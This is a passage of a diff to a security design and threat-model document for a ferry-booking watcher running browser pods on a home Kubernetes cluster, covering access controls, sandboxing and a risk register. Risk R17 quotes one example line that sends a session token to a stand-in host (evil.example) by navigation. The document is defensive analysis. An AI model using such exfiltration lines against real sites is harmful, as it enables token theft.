 | C14 | Pods never serve HTML. vnc-edge serves the stock client with a build-computed CSP (`connect-src 'self' wss://ferry-checkout.chestr.dev`, hashed inline script, `frame-ancestors 'none'`, `base-uri 'none'`, `form-action 'none'`), `Referrer-Policy: no-referrer` and `no-store`. nginx proxies only WS upgrades. vnc-edge stays a stock, logic-free nginx plus static files. | Tenant-compromisable script on a chestr.dev origin; a page pointing the client at a keystroke relay | vnc-edge image and config | M1 |
 | C15 | Ticket only in the URL fragment, resume nonce only in `Sec-WebSocket-Protocol`, the OIDC code only in the URL fragment (`response_mode=fragment`) and then a JSON body, the app session token only in `Authorization` and the dashboard WebSocket's first message; none appears in a path or query that Envoy, nginx or VictoriaLogs records | Tickets, nonces, codes and session tokens leaking into access logs, which VictoriaLogs and `openclaw` can read | landing page + shim + gate; SPA + ferry-web | M1 |
-| C16 | Every Cookie header removed on both routes. Authorization removed on the VNC route; kept on the dashboard route, where it carries only the app's own bearer token. ferry-web sets no cookie. | A pod or a compromised ferry-web replaying the owner's Authelia session into Immich, Windmill or internal apps | HTTPRoute RequestHeaderModifier; post-deploy echo test; a CI test that ferry-web never sends `Set-Cookie` | M1 |
+| C16 | Every Cookie header removed on both routes. Authorization removed on the VNC route; kept on the dashboard route, where it carries only the app's own bearer token. The dashboard route also removes `Remote-User`, `Remote-Groups`, `Remote-Email` and `Remote-Name` (defence in depth for the dev header adapter). ferry-web sets no cookie. | A pod or a compromised ferry-web replaying the owner's Authelia session from the server into Immich, Windmill or internal apps. (Script served from the ferry host can still make same-site requests that carry the cookie; R12.) | HTTPRoute RequestHeaderModifier; post-deploy echo test; a CI test that ferry-web never sends `Set-Cookie` | M1 |
 | C17 | "Cart held" enforced five times: agent (authoritative); web won't mint; ferry-control deletes at `hold_ready_at + hard cap + 5 min` by its own clock; Xvnc `-MaxConnectionTime 6000`; `activeDeadlineSeconds 93600` | VNC kept open outside a hold, by a buggy or lying agent | agent, web, control, Xvnc, kubelet | M1 |
 | C18 | Compiled agent maxima: interval ≥ 30 s, unclaimed ≤ 45 min, session ≤ 45 min, hard ≤ 90 min, viewer-gone ≤ 15 min, ≤ 6 cart attempts per pod; no "0 = forever" | A compromised control plane making holds endless or polling unbounded (not A3, see R13) | agent code (not configurable) | M1 |
 | C19 | Gate revocation: the socket closes on release, expiry, session cap, viewer-gone, `vnc_revoke`, drain or suspend; a viewed hold always ends with the pod exiting | Gateways check only the upgrade [R:map-k8s-research §e] | agent gate; pod delete as the final kill | M1 |
 | C20 | Egress allowlist: Cilium `toFQDNs` on TCP 443 plus a DNS L7 rule that resolves only allowlisted names; deny world, LAN, nodes, kube-apiserver, other pods, smtp-relay and observability | The browser used as a proxy; DNS exfiltration; lateral movement | CiliumNetworkPolicy (GitOps values) | M1 |
 | C21 | Chromium lockdown: `--kiosk`, managed policies in all 3 directories, watchdog, minimal env; self-test requires `ERR_BLOCKED_BY_ADMINISTRATOR` | Escaping to other sites, file://, chrome://, view-source, downloads, extensions | browser image + agent | M1 |
-| C22 | A pod that ever had a viewer never watches again (exit, fresh pod). A departure viewed in checkout is never re-carted | Anything a viewer did persisting into the next session; double bookings | agent (`watcher.py:510-542` changes) + fleet loop | M1 |
-| C23 | Deterministic user id `u = hash(iss, sub)` from the verified `id_token`; `trips.user_id` immutable by trigger; `FW_OWNER` set at pod create and checked by the VAP against the owner label | A DB row re-owning a live or future browser | Postgres trigger + VAP + gate | M1 |
+| C22 | A pod that had a *checkout* viewer never watches again (exit, fresh pod). A departure viewed in checkout is never re-carted by the agent on its own. (A viewer in a future sign-in window, and a re-cart the user explicitly asks for, are named branches that stay disabled in v1, §5.7.) | Anything a viewer did persisting into the next session; double bookings | agent (`watcher.py:510-542` changes) + fleet loop | M1 |
+| C23 | Deterministic user id: at every sign-in `uid = identityAliases.get(h, h)` with `h = hash(iss, sub)`, computed only from the verified `id_token` and the GitOps ConfigMap; the `identities` row is a cache that must equal it (a mismatch refuses the sign-in and alerts the admin); `trips.user_id` immutable by trigger; `FW_OWNER` set at pod create and checked by the VAP against the owner label | A DB row re-owning a live or future browser | Postgres trigger + VAP + gate | M1 |
 | C24 | Per-process DB roles (`ferrywatch_web`, `ferrywatch_control`); `audit_log` INSERT-only for both; RLS lets web insert only `test`, `account`, `admin` and `invited` notifications | A1 rewriting audit, writing pod bindings or trip state, or making forged agent-kind rows appear agent-originated in the outbox (attribution; a compromised web can still message tenants directly, §4.5) | db-migrate grants + RLS | M1 |
 | C25 | Browser namespace without `components/common`; quota `secrets: 0` | Mountable registry/GitHub/Cloudflare secrets | chart; ResourceQuota | M1 |
 | C26 | Logs: browser namespace excluded from Fluent Bit; both ferry namespaces denied egress to observability; debug screenshots stay in tmpfs and none are taken while holding | Checkout screens or tokens reaching VictoriaLogs (unauthenticated) or `openclaw` | home-cluster Fluent Bit + NetworkPolicy + agent | M1 |
 | C27 | Quotas the app can't edit: a PriorityClass-scoped ResourceQuota, `NotTerminating pods: 0`, LimitRange, PriorityClass `preemptionPolicy: Never` | A runaway or compromised operator exhausting the cluster | GitOps objects; no app verbs on them | M1 |
 | C28 | *Withdrawn.* The draft's anchor ConfigMap guard; the anchor no longer exists (§7.8). | — | — | — |
-| C29 | **Rewritten in round 2.** The app verifies identity itself and trusts no identity header: Authorization Code + PKCE S256 with a confidential client; the `id_token`'s signature (issuer JWKS), `iss`, `aud`/`azp`, `exp`/`iat` and `nonce` checked; an opaque 256-bit session token of which only the SHA-256 is stored, with idle and absolute expiry and server-side revocation on logout and suspension; the dashboard WebSocket authenticates with its first message within 5 s. `TrustedHeaderProvider` is off in production, and the chart refuses to render it enabled together with the envoy-external route. | A forged or replayed identity; a session outliving logout or suspension; a gateway misconfiguration admitting anyone (there is no gateway policy to detach, so a mistake fails closed) | ferry-web; chart template guard + helm-unittest; unit tests against a fake issuer | M1 |
+| C29 | **Rewritten in round 2.** The app verifies identity itself and trusts no identity header: Authorization Code + PKCE S256 with a confidential client; the `id_token`'s signature (issuer JWKS, `alg` from an allowlist, `RS256` by default; `none` and HMAC never), `iss`, `aud`/`azp`, `exp`/`iat` and `nonce` checked; an opaque 256-bit session token of which only the SHA-256 is stored, with idle and absolute expiry, re-verification with the IdP at least every 24 h, and server-side revocation on logout and suspension; the dashboard WebSocket authenticates with its first message within 5 s and is closed when its own session is revoked or expires. `TrustedHeaderProvider` is off in production, and the chart refuses to render it enabled together with the external dashboard route. | A forged or replayed identity; a session outliving logout, suspension or removal at the IdP (by more than 24 h); a gateway misconfiguration admitting anyone (there is no gateway policy to detach, so a mistake fails closed) | ferry-web; chart template guard + helm-unittest; unit tests against a fake issuer | M1 |
 | C30 | The termination message (`/dev/termination-log`, readable by the operator through `pods get`) carries only a fixed enum reason and error class | A pod-to-operator channel for tenant data | agent + image test | M1 |
 | C31 | The operator holds no PDB, ConfigMap, Service, route or workload-controller verbs; holds are protected by the agent's drain, not by objects the operator writes | Operator-written objects becoming a lever (the draft's anchor GC hazard) | RBAC; `can-i` negatives | M1 |
 
@@ -522,7 +526,7 @@ once TLS ends; tenants are told (R4).
 
 | Compromised | Can | Cannot |
 |---|---|---|
-| ferry-web (A1) | Phish from the dashboard origin and its service worker. Read every tenant's itineraries and email. Create, edit or delete trips. Release carts. Raise limits up to the GitOps ceilings. Send any text to tenants' push and email (it holds the VAPID key and SMTP access). Act as any user (it is the session authority) and read the session tokens of users who load its pages. **Mint VNC tickets for holding carts**, so it can win the race to a hold's *first* connection (the user then sees "opened on another device", before any card entry), and can pass a ticket out through a push message it sends. | Create, alter or exec into pods. Reach pods. Learn `N`, so it cannot join a session the user already opened (C11) or co-view (C12). Erase audit. Write `trip_state`, pod bindings or alert memory (role grants). Get tokens for any other OIDC client of Authelia (its secret is for the `ferry-watch` client only) or see the owner's Authelia cookie (removed at the route). |
+| ferry-web (A1) | Phish from the dashboard origin and its service worker. Read every tenant's itineraries and email. Create, edit or delete trips. Release carts. Raise limits up to the GitOps ceilings. Send any text to tenants' push and email (it holds the VAPID key and SMTP access). Act as any user (it is the session authority) and read the session tokens of users who load its pages. Serve script that makes blind same-site requests to other `chestr.dev` apps carrying the owner's Authelia cookie (R12). **Mint VNC tickets for holding carts**, so it can win the race to a hold's *first* connection (the user then sees "opened on another device", before any card entry), and can pass a ticket out through a push message it sends. | Create, alter or exec into pods. Reach pods. Learn `N`, so it cannot join a session the user already opened (C11) or co-view (C12). Erase audit. Write `trip_state`, pod bindings or alert memory (role grants). Get tokens for any other OIDC client of Authelia (its secret is for the `ferry-watch` client only) or see the owner's Authelia cookie (removed at the route). |
 | vnc-edge (A1) | **Fully inside the VNC confidentiality and integrity boundary**: read keystrokes and screens of sessions passing through it, inject key and pointer events (`-AcceptCutText=1` included), observe tickets and `N`, and use an observed `N` to reconnect (and, with preemption, displace the user's socket) for the rest of that hold. Hold sockets open. | Mint tickets. Reach any pod path other than `:6080/ws`. Reach ferry-web, ferry-control or Postgres. Mitigation: vnc-edge is a stock nginx image with static files and a short config, no secrets and no app code. Envoy and Cloudflare sit in the same boundary (R4). |
 | ferry-control (A4, through A3) | Forge any trip's status. Send `release`, `drain` or `vnc_revoke` to any agent. Write typed agent alerts for any user. **Create and delete pinned browser pods** for any trip and owner, up to the ResourceQuota (availability, and IP-budget abuse through the pods it starts). Read tenants' itineraries and emails (its DB grants include them). | Mint VNC tickets (no key). Change image, env, volumes or commands (VAP). Read Secrets, exec, read logs, proxy. Get page content. Touch any other namespace. Write `users`, limits or audit updates (role grants). |
 | A browser pod (A3) | Its own tenant's current session and card entry. Lie about its own trip, within the operator's clock and the deadline. Attack ferry-control's parser. **Send unbounded requests from the home IP to the allowlisted hosts** (bcferries.com, Queue-it, 3DS hosts), bypassing the agent's budget; bounded only by the egress bandwidth annotation, if S-CIL shows it works (R13). | Reach other pods, the API server, the LAN, smtp-relay, observability or the internet beyond the allowlist. Use its token anywhere but ferry-control. Affect another tenant's trip. |
@@ -543,30 +547,44 @@ once TLS ends; tenants are told (R4).
     `user.max_user_namespaces=0`, and containerd's default seccomp profile blocks the calls, §2.2). So
     Playwright starts Chromium with `--no-sandbox`: `site.py:154-157` launches it without
     `chromium_sandbox`, and Playwright's default is to add the flag.
-  - *What that means.* A malicious script on bcferries.com, or on a payment or 3-D Secure page, that
-    exploits a Chromium bug runs code directly in that pod, as uid 1001, the same user as the agent, during
-    the very session in which the user types their card.
-  - *What contains it.* One pod per trip, destroyed after any viewed hold; no stored secrets and no API
-    token in the pod; the egress allowlist; the in-pod gate's checks. The damage stays inside that one
-    session (plus the home IP's budget, R13).
+  - *What that means.* A malicious script on bcferries.com, Queue-it, or a payment or 3-D Secure page that
+    exploits a Chromium bug runs code directly in that pod, as uid 1001, the same user as the agent and the
+    gate. It can land at any point in the pod's life, not only during checkout: a pod renders BC Ferries
+    and Queue-it pages for up to about a day before any hold (C17's 26 h deadline). It can then wait for the
+    checkout and read the card as it is typed; it can also open Xvnc's socket (C13).
+  - *What contains it, and how far.* One pod per trip, destroyed after any viewed hold and within 26 h; no
+    stored secrets and no API token in the pod; the egress allowlist; the hub binding to its own trip. That
+    keeps the damage to one tenant's pod (plus the home IP's budget, R13) **only while two other layers
+    hold**:
+    - ferry-control's parser. A parser exploit is A4 (§4.5): it reads every tenant's itineraries and emails
+      and creates or deletes pinned pods for any owner (C3).
+    - The Linux kernel. No LSM confines the container (`apparmor=0 security=none`), and every node is a
+      control-plane node that also runs workloads (`talos/controlplane.yaml:191`). A kernel escape from a
+      browser pod is therefore node root next to etcd and the API server: the whole home cluster, including
+      the writable 1Password ClusterSecretStore and Authelia.
   - *What would put the sandbox back.* Enabling user namespaces on Talos (the sysctl plus a Localhost
     seccomp profile, applied per node) and turning on the VAP params `sandbox`, `seccompProfile` and
-    `requireUserNamespace` (S-SBX).
-  - *The kernel flags.* Separately, the nodes boot with `mitigations=off` (CPU side-channel mitigations
-    disabled for speed), `apparmor=0` and `security=none`. With several people's browsers running untrusted
-    web content on the same nodes, a side-channel attack could in theory leak data across tenants; each
-    Chromium's own site isolation still applies. A kernel exploit from a pod would reach the node and every
-    tenant on it.
-  - *Decision (owner, round 2).* Both are risk acceptance, not something the product needs to work.
-    Enabling the sandbox and revisiting the kernel flags is **optional hardening in the backlog (M4), the
-    owner's call, recommended before inviting people the owner doesn't know well**, and not a gate unless the
-    owner later makes it one. The VAP params that can require it stay in place (a two-way door).
+    `requireUserNamespace` (S-SBX). Then a renderer exploit needs a second, sandbox-escape bug before it
+    reaches the pod.
+  - *The kernel flags.* Separately, the nodes boot with `mitigations=off` (the kernel's defences against
+    CPU side channels of the Spectre and MDS kind are disabled for speed, on Intel CPUs), `apparmor=0` and
+    `security=none`. Page JavaScript alone is limited by each Chromium's site isolation and coarse timers.
+    But once an exploit gives native code in an unsandboxed pod, side-channel attacks can target kernel
+    memory and every workload on that node, not only other tenants' browsers.
+  - *Recommendation (planner's; the owner asked why it was needed and has not yet decided, Q12).* Neither
+    change is needed for the product to work; both are risk acceptance. Enabling the sandbox (with
+    `hostUsers: false`) and revisiting the kernel flags is proposed as **optional hardening in the backlog
+    (M4, about 4 days: S-SBX about 1, the change about 3), recommended before inviting people the owner
+    doesn't know well**, and not a gate unless the owner makes it one. Accepting it means accepting a
+    Chromium exploit as a risk to that tenant's checkout, and, chained with a kernel or parser bug, to the
+    whole cluster. The VAP params that can require the sandbox stay in place (a two-way door).
 - **R3 A compromised ferry-web can race a hold's first VNC connection** (visible, before card entry), and can
   phish through the dashboard and alerts. Closing the race needs an IdP-asserted principal verified by the
   pod (S-VNCID), deferred to M4. Accepting R3 for invite-only friends and family is Q1.
 - **R4 Plaintext keystrokes on infrastructure.** Cloudflare's edge, cloudflared, Envoy, vnc-edge and the pod
-  see checkout keystrokes (RFB is plaintext after TLS ends). vnc-edge, Envoy and Cloudflare can also inject
-  input and reuse `N`. Whether relaying a cardholder's own keystrokes puts the owner in PCI scope is a grey
+  see checkout keystrokes (RFB is plaintext after TLS ends), including a BC Ferries password if a user signs
+  in during checkout despite the advice (§5.7). vnc-edge, Envoy and Cloudflare can also inject input and
+  reuse `N`. Whether relaying a cardholder's own keystrokes puts the owner in PCI scope is a grey
   area. Tenants are told, naming Cloudflare.
 - **R5 BC Ferries' own page supply chain.** Third-party scripts on bcferries.com or the payment pages can skim
   cards to allowlisted hosts, exactly as in a normal browser.
@@ -586,10 +604,19 @@ once TLS ends; tenants are told (R4).
   10 min, as that pod only. TLS or WireGuard on :8766 is M4.
 - **R11 Integrity and availability of the control plane.** Any compromised control process can delete trips,
   release carts or stop pods. Audit makes this visible; it does not prevent it.
-- **R12 The Authelia cookie.** Resolved in v1: the app sets no cookie, so the dashboard route removes the
-  whole Cookie header (C16). It returns only if a later design puts a cookie on the ferry host (an app
-  cookie, a cookie-based proxy, or Envoy Gateway's OIDC filter) while Authelia still serves the owner's
-  apps; the choice between gateway-wide Lua and a separate domain then comes back (§6.2.5).
+- **R12 The Authelia cookie.** Server-side replay is resolved in v1: the app sets no cookie, so the dashboard
+  route removes the whole Cookie header and ferry-web never sees `authelia-home-ops` (C16). What the route
+  cannot stop is the browser itself: script served from `ferry.chestr.dev` is same-site with every
+  `*.chestr.dev` app, and the cookie is `SameSite=Lax` (Authelia's default, upstream
+  `internal/configuration/schema/session.go:30,89`; not overridden in `configuration.yaml:32-41`), so the
+  browser attaches it to same-site requests that script makes. An injected script is held back by the
+  dashboard's CSP (`connect-src 'self'`, `form-action 'self'`), but a compromised ferry-web serves its own
+  CSP and could send blind state-changing requests to the owner's other `chestr.dev` apps as the owner.
+  Every other app on `chestr.dev` has the same exposure today. A separate registrable domain for Ferry Watch
+  (the old Q6 option) is the remaining mitigation; it stays possible later (new hostnames, certificate and
+  tunnel entries; users sign in again and re-subscribe to push). The server-side half returns only if a
+  later design puts a cookie on the ferry host (an app cookie, a cookie-based proxy, or Envoy Gateway's
+  OIDC filter); the choice between gateway-wide Lua and a separate domain then comes back (§6.2.5).
 - **R13 A3 can spend the home IP's budget.** The budget, brake and 30 s floor live in agent code. Code
   execution in a pod (after a Chromium exploit under `--no-sandbox`, R2) bypasses them toward the allowlisted
   hosts. The only technical bound is `kubernetes.io/egress-bandwidth: 20M`, a bytes-per-second cap (many
@@ -608,25 +635,52 @@ once TLS ends; tenants are told (R4).
   step 6). S-3DS shrinks but cannot close the gap (Q8).
 - **R17 The app session token is readable by script on the dashboard origin.** The bearer token lives in
   localStorage on `ferry.chestr.dev`, so any XSS there (a bug in the SPA, or a compromised dependency in its
-  bundle) can read it and use it from another device until it expires or is revoked. An HttpOnly cookie
-  would hide it from script but would bring the cookie problem back (R12), and XSS could act as the user
-  with a cookie too; what the cookie would add is only "not usable off-device". Mitigations: the existing
-  strict hash-based CSP (`server.py:232-251`: scripts only from `'self'` plus hashed inline bootstraps,
-  `connect-src 'self'`, `form-action 'self'`, `base-uri 'none'`), which makes both injection and
-  exfiltration hard; 7-day idle and 30-day absolute expiry; server-side revocation on logout, "sign out
-  everywhere" and suspension; and VNC still needs a ticket bound to the pod's owner, trip and cart, with a
-  first-viewer lock a stolen session cannot pass once the user is connected (C11).
+  bundle) can read it, send it off-origin and use it from another device until it is revoked or its next IdP
+  re-verification falls due (at most 24 h; a thief cannot re-verify without the victim's Authelia session,
+  §6.2.2). An HttpOnly cookie would hide it from script but would bring the cookie problem back (R12), and
+  XSS could act as the user with a cookie too; what the cookie would add is only "not usable off-device".
+  The existing strict hash-based CSP (`server.py:232-251`: scripts only from `'self'` plus hashed inline
+  bootstraps, `connect-src 'self'`, `form-action 'self'`, `base-uri 'none'`) makes injection hard and
+  blocks exfiltration by fetch, XHR, WebSocket and forms, but a script that does run can still leak the
+  token by navigation (for example `location = 'https://evil.example/?t=' + token`), which no CSP directive
+  restricts. The rest rests on: the 24 h re-verification, 7-day idle and 30-day absolute expiry, server-side
+  revocation on logout, "sign out everywhere" and suspension, and VNC still needing a ticket bound to the
+  pod's owner, trip and cart, with a first-viewer lock a stolen session cannot pass once the user is
+  connected (C11). A shorter re-verification period, or a device-bound token (a DPoP-style proof from a
+  non-extractable WebCrypto key), would shrink the window further (M4).
 - **R18 Sign-in from the iOS home-screen app may land in another browser context.** A home-screen web app
   keeps its own storage, separate from Safari. If iOS opens the redirect to Authelia, or the redirect back,
   outside the app, the callback cannot find the app's `state` and PKCE verifier, and sign-in fails or
-  happens in Safari instead. Unverified; S-IOS checks it on the owner's iPhone during M1. The fallback is a
-  one-time handoff code (§6.2.4).
+  happens in Safari instead. A first sign-in also leaves the app partway through (to Mail for Authelia's
+  enrolment code, to an authenticator app or a passkey prompt); if iOS evicts the backgrounded app, it
+  relaunches at `/` and the in-flight sign-in is lost. Unverified; S-IOS checks both on the owner's iPhone
+  during M1. The fallbacks are a one-time handoff code, a pending sign-in kept in localStorage for 10 minutes,
+  and first enrolment in Safari or on a computer (§6.2.4).
 - **R19 Unauthenticated requests now reach ferry-web.** Under ext-auth nothing reached ferry-web without an
   Authelia session. Now anyone the Cloudflare geo-block lets through can load the static shell, call
   `/auth/*`, open a WebSocket that must authenticate within 5 s, and get 401 from `/api/*`. No data or
   action is reachable without a valid session. The pre-auth surface is kept small: request bodies on
-  `/auth/*` are capped at 4 KiB and globally rate-limited, unauthenticated sockets are capped in number, and
-  aiohttp stays pinned and patched.
+  `/auth/*` are capped at 4 KiB; `/auth/*` and unauthenticated sockets are rate-limited and capped per
+  client (keyed on `CF-Connecting-IP`), with a global ceiling only as a backstop, so one client cannot use up
+  everyone's sign-ins (a Cloudflare rate-limiting rule on `/auth/*` and `/api/ws` is an option); the
+  dashboard socket accepts messages of at most 4 KiB; and aiohttp stays pinned and patched.
+- **R20 IdP changes reach the app at the next re-verification, not at once.** Authelia applies the client's
+  authorization policy, and refreshes the user from LDAP, only when it handles an authorization request
+  (§2.2). Under the ext-auth design every request was re-checked; now ferry-web trusts its own session
+  between visits to Authelia. Removing someone from lldap group `ferry-watch`, disabling or deleting them in
+  lldap, or resetting a compromised Authelia account therefore takes effect in the app at that person's
+  next re-verification, at most 24 h later (§6.2.2), and only then are `autoApproveGroups` and
+  `identities.last_groups` re-read. Until then they keep full access, including VNC ticket minting for their
+  own holds. The "Removing a person" runbook (§12.5) suspends them in the app first, which revokes every
+  session and closes their sockets at once, and changes lldap second.
+- **R21 Authelia's `sub` follows the username.** Authelia creates the opaque `sub` per username and reuses it
+  (`internal/oidc/store.go:76-101`). A new lldap user given a username that someone used before receives the
+  old person's `sub`, so the old uid: their trips, push subscriptions (the old person's devices would get
+  the new person's alerts), admin or bootstrap status, and VNC tickets that pass the pod's
+  `sub == FW_OWNER` check. lldap usernames are unique only at a given moment. Mitigations: never reuse an
+  lldap username, or delete the user in Ferry Watch (user, `identities` row, push subscriptions) before
+  deleting or renaming them in lldap (§12.5); a sign-in whose `email` differs from the stored one is
+  flagged on the Users page for review.
 
 ---
 ## 5. Browser pod (agent)
@@ -666,7 +720,7 @@ No lifecycle hooks exist, so the VAP forbids them outright. This fixes three thi
 | Today | Becomes |
 |---|---|
 | `watcher.py:42`, `:103`, `:131` ConfigStore and its subscription | `OneTripStore` (same `.config` and `.subscribe` surface), fed by `configure`. `rev` replaces the in-process edit re-reads (`:251-255`, `:426-428`, `:461-468`); a `state` older than the latest rev is dropped. |
-| `watcher.py:54` `LOGIN_BACKOFF_SECONDS`, `:110` credentials, `:122` secrets, `:128` `_login_lock`, `:130` `_login_blocked_until`, `:299-300`, `:315-318`, `:333-349` login and back-off | Not wired in guest mode (`credentials=None`, `_wants_login` always False). **Kept, not deleted**, with its tests, behind a disabled `login_enabled` flag that v1 images never set, so an account mode can return without rewriting it (a two-way door, §5.7). |
+| `watcher.py:54` `LOGIN_BACKOFF_SECONDS`, `:110` credentials, `:122` secrets, `:128` `_login_lock`, `:130` `_login_blocked_until`, `:299-300`, `:315-318`, `:333-349` login and back-off | Not wired in guest mode (`credentials=None`, `_wants_login` always False). **Kept, not deleted**, behind a disabled `login_enabled` flag that v1 images never set, with its tests ported to the one-trip agent and run in CI with the flag forced on (§11.4), so an account mode can return without rewriting it (a two-way door, §5.7). |
 | `watcher.py:113`, `:127` `concurrency=3`, `_slots` | Concurrency 1; the semaphore is removed. |
 | `watcher.py:141-145` `check_now` for all trips | `command{check_now}` for this trip; ignored if a check ran in the last 15 s. |
 | `watcher.py:147-162` `release_cart`/`dismiss_cart` with the `cart_id` token | Unchanged, driven by `command{release, cart_id}` and `command{dismiss, cart_id}`. |
@@ -679,12 +733,12 @@ No lifecycle hooks exist, so the VAP forbids them outright. This fixes three thi
 | `watcher.py:112`, `:124`, `:498`, `:516`, `:526`, `settings.py:30`, `:50-54` `cart_hold_minutes` (0 = forever) | A `HoldPolicy` with four clocks: unclaimed (from control ack), session (from first connect), viewer-gone (from last disconnect), hard (from READY). All clamped to compiled maxima; "forever" no longer exists. A **payment guard** pauses session and viewer-gone while a frame is on a payment/3DS host or the payment step was submitted. |
 | `watcher.py:510-542` `_service_cart` | Gains the timers, viewer state, the release check, cart-liveness checks while unclaimed, BC Ferries confirmation detection (`outcome=booked`), detection of the login page or an account-required page during checkout (`checkout_login_seen`) and of a cart the site has expired, and C22. After a **viewed** hold: empty (unless payment is in progress), verify, `bye`, exit 0 (instead of resuming at `:536-541`). After an unviewed expiry: resume in place. |
 | `watcher.py:529-530` window closed, watching resumed | Not reachable: the window is the pod; viewer disconnects are handled by the gate clocks. |
-| `watcher.py:531-535` lost cart: forget the alert and re-cart | Re-cart only if no viewer ever connected. If a viewer had connected, keep the departure in `alerted`. |
+| `watcher.py:531-535` lost cart: forget the alert and re-cart | Re-cart only if no checkout viewer ever connected. If one had, keep the departure in `alerted` (C22). |
 | `watcher.py:368-373` `_close_all` | Empties and verifies held carts before closing (drain path). |
 | `watcher.py:555-564` `_alert` builds a `Message` with a URL | Emits `alert{kind, params}` (typed, no text, no URL). |
 | `watcher.py:96-97`, `:568-595` alert memory keyed by `repr(search_key)` | `alerted[]` and `offered[]` arrive in `configure`, persisted by ferry-control, keyed by `sha256(canonical JSON of search_key)`. A held departure is removed on boot, as today (`:577`). |
 | `site.py:149-160` `_launch` | `launch_persistent_context("/tmp/profile")` with `--kiosk`, `--disk-cache-size=33554432` and `ignore_default_args=["--disable-popup-blocking"]`. `env={DISPLAY, HOME, TMPDIR, TZ}`. `handle_sig*=False`. `chromium_sandbox=(FW_SANDBOX=="1")`. |
-| `site.py:167-176` `new_session` | Pages come from the single persistent context; the user agent is unchanged (Q9). |
+| `site.py:167-176` `new_session` | Pages come from the single persistent context; the user agent is unchanged (Q4). |
 | `site.py:400-401` `empty_cart` | Navigates, then **checks the landing URL now**; the full "cart is empty" check is added once the cart and release pages are captured from the owner's M1 use. Until then a release is best effort, with BC Ferries' own cart timer as the backstop, and every release is counted by how far it was checked (`release_check` in `bye`; `ferrywatch_releases_total{check}`). A failed landing-URL check (or, later, a non-empty cart) raises `ReleaseUnverified`; the admin is alerted. |
 | `site.py:407-422` debug snapshots | tmpfs only, none while holding, never fetchable. |
 | `site.py:42-47`, `:66-87` `BASE_URL`, `USER_AGENT`, `Credentials`, `search_url` | Move to `ferry_watch_core/bcferries/urls.py` (Playwright-free). `Credentials` is kept for the disabled login path. |
@@ -708,7 +762,7 @@ dedupes on `(pod_uid, boot, seq)`.
 |---|---|---|
 | A→C | `hello` | `proto: [1]`, `agent_version`, `image_digest`, `pod_name`, `gen`, `applied_rev`, `snapshot` (a `state`), `unacked[]` |
 | A→C | `state` | `phase` (starting/watching/holding/draining), `checking`, `checked_at`, `next_due`, `retry_at`, `effective_interval`, `sailings[≤60]{depart, arrive, vessel≤64, status enum, fares[≤6]{name≤32, price, selectable}}`, `error{class enum, text≤300 masked by describe()}`, `consecutive_errors`, `cart{id, status, depart, fare, price, ready_at, unclaimed_deadline, session_deadline, hard_deadline, payment_in_progress}\|null`, `viewer{connected, first_at, seconds}`, `alerted[HH:MM ≤100]`, `offered[HH:MM ≤100]`, `navs{refresh, search, cart, empty, route_info}` since the last message, `queue_detours`, `working_set_mb`, `lockdown_ok`, `bucket`. Sent on change (coalesced over 250 ms) and at least every 15 s. |
-| A→C | `event` | `code` enum (session_opened, sold_out_again, check_failed, cart_added, cart_released, viewer_connected, viewer_disconnected, booking_confirmed, checkout_host_blocked, checkout_login_seen, cart_expired_by_site, opening_seen, opening_gone, …), `params{depart?, fare?, minutes?, class?, seconds?}`. No free text, no hostnames. |
+| A→C | `event` | `code` enum (session_opened, sold_out_again, check_failed, cart_added, cart_released, viewer_connected, viewer_disconnected, booking_confirmed, checkout_host_blocked, checkout_login_seen, cart_expired_by_site, opening_seen, opening_gone, …), `params{depart?, fare?, minutes?, class?, seconds?, forced?}` (`forced` only on `checkout_login_seen`, §5.7). No free text, no hostnames. |
 | A→C | `alert` | `kind` enum (bookable, cart_held, cart_failed, cart_lost, cart_expired, failing, hold_reminder, hold_ending, release_unverified, checkout_blocked), `params{departures[≤10], fare?, price?, minutes?, error_class?, by_site?}` |
 | A→C | `bye` | `reason` enum (hold_ended, drained, deadline, recycle, startup_failed, lockdown_failed, fatal, smoke_done), `outcome` enum (booked, released, expired, expired_by_site, payment_left_to_site, none), `cart_emptied`, `release_check` enum (cart_empty, landing_url, none), `viewer_was_connected` |
 | C→A | `hello_ack` | `server_time`, `accepted_proto`, `resend_from` |
@@ -753,6 +807,11 @@ other path returns 404, and it never serves HTML.
 
 `{iss: "fw-web", aud: "fw-vnc", sub: <uid>, trip, pod, cart_id, jti, iat, exp: iat+60, disp: {route≤64, date, depart, fare≤32, session_s, hard_deadline}}`
 
+`aud` names the ticket's purpose. v1 defines one audience, `fw-vnc` (checkout): its ticket carries `cart_id`
+and its step-2 condition below is a READY cart. The gate rejects every other audience. A later purpose, such
+as a sign-in window before any cart (§15), would be a new audience with its own condition and no `cart_id`
+(`vnc_mints.cart_id` is nullable for that reason): an addition, not a change to the checkout path.
+
 `disp` is decoded but not trusted by the landing page, which shows it with `textContent` only. At first
 connect the landing page stores `session deadline = now + session_s` with `N` and shows "Checkout closes at
 hh:mm (paused while you're on the payment page)" and the hard deadline.
@@ -760,7 +819,8 @@ hh:mm (paused while you're on the payment page)" and the hard deadline.
 **Upgrade checks, all required, in order:**
 1. `Origin == FW_VNC_ORIGIN` (`https://ferry-checkout.chestr.dev`). Page JS in the pod's own Chromium cannot pass
    this (its Origin is bcferries.com).
-2. `lockdown_ok`, not draining, `vnc_allowed`, a local cart READY, and every hold clock still running.
+2. `lockdown_ok`, not draining, `vnc_allowed`, and, for the `fw-vnc` audience (the only one in v1), a local
+   cart READY with every hold clock still running.
 3. Either:
    - **first connect:** the lock is unset and the subprotocols contain `fw.t1.<ticket>` and `fw.n1.<N>`. The
      ticket must verify against one of `FW_VNC_PUBKEYS` with the right `aud`, an unexpired `exp`, and
@@ -808,7 +868,11 @@ have a separate cookie jar. An IdP-asserted principal that the pod verifies itse
 it [R:limits-browser-lockdown §b]. Settings:
 - `URLBlocklist: ["*","chrome://*","chrome-untrusted://*","devtools://*","view-source:*","file://*","javascript://*","localhost","127.0.0.1","[::1]"]`
   plus `URLAllowlist: ["about:blank","bcferries.com","queue-it.net", <payment and 3DS hosts learned from the owner's M1 checkouts and S-3DS>]`.
-  `bcferries.com` covers every path on the site, including `/login` (§5.7).
+  `bcferries.com` covers every path on the site, including `/login`. The login page is not blocked; §5.7
+  advises users not to sign in during checkout. If the owner prefers to block it, a `URLBlocklist` entry
+  `bcferries.com/login` is enough (Chromium applies the most specific matching filter, so the longer path
+  wins over the allowlisted host; confirm in S-KIOSK), at the cost of a future account mode needing it
+  removed again (an image change, so a two-way door).
   The blocklist covers navigations including subframes, not fetch or WebSocket, which is why C13 does not
   rely on it. S-KIOSK confirms the subframe behaviour, because it decides whether an unknown 3DS iframe is
